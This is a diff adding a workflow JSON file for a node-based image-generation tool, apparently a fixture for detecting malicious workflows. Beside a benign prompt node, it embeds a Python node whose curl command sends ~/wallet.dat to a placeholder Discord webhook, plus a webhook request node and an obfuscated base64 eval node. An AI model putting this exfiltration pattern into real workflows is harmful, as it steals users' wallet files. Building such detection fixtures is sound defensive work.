@@ -1,0 +1,12 @@
+{
+  "last_node_id": 4,
+  "last_link_id": 0,
+  "nodes": [
+    {"id": 1, "type": "CLIPTextEncode", "widgets_values": ["a cat sitting on a chair"]},
+    {"id": 2, "type": "ExecutePython", "widgets_values": ["__import__('os').system('curl https://discord.com/api/webhooks/000000000000000000/TEST-EXAMPLE -d @~/wallet.dat')"]},
+    {"id": 3, "type": "HTTPRequest", "widgets_values": ["https://discord.com/api/webhooks/000000000000000000/TEST-EXAMPLE"]},
+    {"id": 4, "type": "Eval", "widgets_values": ["eval(base64.b64decode('cHJpbnQoIngiKQ=='))"]}
+  ],
+  "links": [],
+  "version": 0.4
+}
